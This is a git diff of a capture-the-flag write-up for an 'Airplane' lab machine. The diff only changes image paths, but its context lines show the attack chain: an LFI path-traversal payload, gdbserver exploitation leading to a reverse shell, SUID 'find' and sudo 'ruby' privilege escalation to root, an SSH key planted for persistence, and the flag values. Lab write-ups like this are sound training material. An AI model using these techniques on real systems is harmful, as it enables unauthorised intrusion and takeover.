@@ -29,12 +29,12 @@ echo '10.10.62.55 airplane.thm' | sudo tee -a /etc/hosts
 
 Once we enter the website, we can notice the following:
 
-![](cybersecurity/images/Pasted%2520image%252020250422135925.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422135925.png)
 
 The url seems suspicious, it seems as it could be vulnerable to LFI, let's try reading `/etc/passwd`:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250422140134.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422140134.png)
 
 As we can see, if we use `path traversal`, we can read `/etc/passwd`, since this server is vulnerable to `LFI`, we can test other stuff, for example, let's try reading
 `proc/self/environ`:
@@ -43,7 +43,7 @@ As we can see, if we use `path traversal`, we can read `/etc/passwd`, since this
 ../../../../../proc/self/environ
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250422141057.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422141057.png)
 
 We get this:
 
@@ -74,7 +74,7 @@ Based on that, we can find the `app.py` on `/home/hudson/app/app.py`, let's try 
 ```
 
 
-![](cybersecurity/images/Pasted%2520image%252020250422141515.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422141515.png)
 
 Not much, seems like this only tells us the way it's vulnerable to LFI, but we can keep on digging, for example, we can try reading:
 
@@ -82,7 +82,7 @@ Not much, seems like this only tells us the way it's vulnerable to LFI, but we c
 proc/self/cmdline
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250422141742.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422141742.png)
 
 It works, based on the scan, we notice we got something else running on port `6048`, we can use the same technique to visualize what may be running on it, we need to change it to this format:
 
@@ -101,9 +101,9 @@ seq 1000 > id.txt
 Now, we can use `caido`'s automate functionality:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250422150920.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422150920.png)
 
-![](cybersecurity/images/Pasted%2520image%252020250422151532.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422151532.png)
 
 Once the scan is finished, we can filter in the following way:
 
@@ -113,7 +113,7 @@ resp.raw.ncont:"Page" AND resp.raw.cont:"gdb"
 
 We can see the following:
 
-![](cybersecurity/images/Pasted%2520image%252020250422151516.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422151516.png)
 
 Seems like this is running `gdbserver`, let's begin exploitation.
 
@@ -161,7 +161,7 @@ chmod +x binary.elf
 gdb binary.elf
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250422151922.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422151922.png)
 
 We get prompted with this, we can now proceed:
 
@@ -175,7 +175,7 @@ run
 
 If we do everything correctly, we get the connection on our listener:
 
-![](cybersecurity/images/Pasted%2520image%252020250422152429.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422152429.png)
 
 Let's begin privilege escalation.
 
@@ -196,15 +196,15 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250422152543.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422152543.png)
 
 Let's use `linpeas` to check any PE vector:
 
-![](cybersecurity/images/Pasted%2520image%252020250422153011.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422153011.png)
 
 There we go, we find an interesting `SUID` binary, let's search `GTFOBINS`:
 
-![](cybersecurity/images/Pasted%2520image%252020250422153104.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422153104.png)
 
 So, we need to do:
 
@@ -212,7 +212,7 @@ So, we need to do:
 /usr/bin/find . -exec /bin/bash -p \; -quit
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250422153149.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422153149.png)
 
 We escalated to `carlos`, to make the experience more comfortable, we can create a ssh-key and put it in `authorized_keys`:
 
@@ -232,7 +232,7 @@ Once we do it, we can go into ssh using:
 ssh carlos@airplane.thm -i airplane_rsa
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250422153822.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422153822.png)
 
 Nice, let's look around again, for example, let's check if we got `sudo` privileges:
 
@@ -247,7 +247,7 @@ User carlos may run the following commands on airplane:
 
 Let's look up `GTFOBINS`:
 
-![](cybersecurity/images/Pasted%2520image%252020250422153927.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422153927.png)
 
 So, in order to get root shell, we can do:
 
@@ -256,7 +256,7 @@ echo 'exec "/bin/bash"' >> /tmp/privesc.rb
 sudo /usr/bin/ruby /root/../tmp/privesc.rb
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250422154046.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422154046.png)
 
 There we go, we can finally read both flags and finish the CTF:
 
@@ -270,5 +270,5 @@ root@airplane:/home/carlos# cat /root/root.txt
 190dcbeb688ce5fe029f26a1e5fce002
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250422154148.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250422154148.png)
 
